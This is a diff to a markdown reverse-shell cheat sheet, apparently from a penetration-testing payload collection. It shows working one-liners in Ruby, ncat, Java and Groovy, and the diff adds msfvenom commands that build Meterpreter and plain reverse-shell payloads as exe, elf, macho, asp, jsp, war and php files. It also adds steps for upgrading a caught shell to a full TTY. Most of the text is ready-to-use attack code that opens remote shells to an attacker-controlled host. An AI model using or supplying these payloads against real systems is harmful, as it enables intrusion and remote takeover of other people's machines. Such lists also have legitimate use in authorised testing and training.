@@ -1,6 +1,36 @@
-# Reverse Shell Methods
+# Reverse Shell Cheat Sheet
 
-## Reverse Shell Cheat Sheet
+## Summary
+
+* [Reverse Shell](#reverse-shell)
+    * [Bash TCP](#bash-tcp)
+    * [Bash UDP](#bash-udp)
+    * [Perl](#perl)
+    * [Python](#python)
+    * [PHP](#php)
+    * [Ruby](#ruby)
+    * [Golang](#golang)
+    * [Netcat Traditional](#netcat-traditional)
+    * [Netcat OpenBsd](#netcat-openbsd)
+    * [Ncat](#ncat)
+    * [OpenSSL](#openssl)
+    * [Powershell](#powershell)
+    * [Awk](#awk)
+    * [Java](#java)
+    * [War](#war)
+    * [Lua](#lua)
+    * [NodeJS](#nodejs)
+    * [Groovy](#groovy)
+* [Meterpreter Shell](#meterpreter-shell)
+    * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
+    * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
+    * [Linux Staged reverse TCP](#linux-staged-reverse-tcp)
+    * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
+    * [Other platforms](#other-platforms)
+* [Spawn TTY Shell](#spawn-tty-shell)
+* [References](#references)
+
+## Reverse Shell
 
 ### Bash TCP
 
@@ -77,6 +107,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 NOTE: Windows only
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
+
 ### Golang
 
 ```bash
@@ -102,7 +133,7 @@ ncat 127.0.0.1 4444 -e /bin/bash
 ncat --udp 127.0.0.1 4444 -e /bin/bash
 ```
 
-## OpenSSL
+### OpenSSL
 
 ```powershell
 hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
@@ -194,8 +225,9 @@ or
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
-### Groovy - by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+### Groovy
 
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 NOTE: Java reverse shell also work for Groovy
 
 ```javascript
@@ -205,16 +237,66 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-## Spawn TTY
+## Meterpreter Shell
+
+### Windows Staged reverse TCP
+
+```powershell
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe > reverse.exe
+```
+
+### Windows Stageless reverse TCP
+
+```powershell
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe > reverse.exe
+```
+
+### Linux Staged reverse TCP
+
+```powershell
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f elf >reverse.elf
+```
+
+### Linux Stageless reverse TCP
+
+```powershell
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f elf >reverse.elf
+```
+
+### Other platforms
+
+```powershell
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
+$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
+$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
+$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+```
+
+## Spawn TTY Shell
 
 Access shortcuts, su, nano and autocomplete in a partially tty shell
-/!\ OhMyZSH might break this trick, a simple `sh` is recommended
+
+:warning: OhMyZSH might break this trick, a simple `sh` is recommended
+
+> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect
 
 ```powershell
 ctrl+z
 echo $TERM && tput lines && tput cols
+
+# for bash
 stty raw -echo
 fg
+
+# for zsh
+stty raw -echo; fg
+
 reset
 export SHELL=bash
 export TERM=xterm-256color
